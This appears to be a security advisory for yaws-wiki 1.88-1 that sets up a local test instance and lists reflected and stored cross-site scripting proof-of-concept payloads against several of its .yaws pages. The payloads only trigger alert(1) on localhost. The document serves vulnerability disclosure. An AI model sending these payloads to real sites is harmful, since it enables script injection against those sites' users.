@@ -1,0 +1,33 @@
+Application: yaws-wiki
+version affected: 1.88-1
+platform:  Erlang
+homepage:http://yaws.hyber.org/
+Researcher: Michael Brooks
+Orignal Advisory:https://sitewat.ch/en/Advisory/4
+
+Install instructions for Ubuntu:
+sudo apt-get install yaws-wiki
+
+Edit:/etc/yaws/conf.d/yaws-wiki.conf
+#add this:
+<server wiki>
+ port = 8181
+ listen = 0.0.0.0
+ docroot = /var/lib/yaws-wiki
+</server>
+
+Then restart yaws:
+sudo /etc/init.d/yaws restart
+
+
+Reflective XSS:
+http://localhost:8181/editTag.yaws?node=ALockedPage&tag=%3E%3C/pre%3E%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+http://localhost:8181/showOldPage.yaws?node=home&index=%3E%3C/pre%3E%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+http://localhost:8181/allRefsToMe.yaws?node=%3E%3C/pre%3E%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+
+Stored XSS:
+http://localhost:8181/editPage.yaws?node=home
+
+The large textbox on the editPage.yaws page is vulnerable to xss.  This is
+the"text" post variable:
+<script>alert(1)</script>
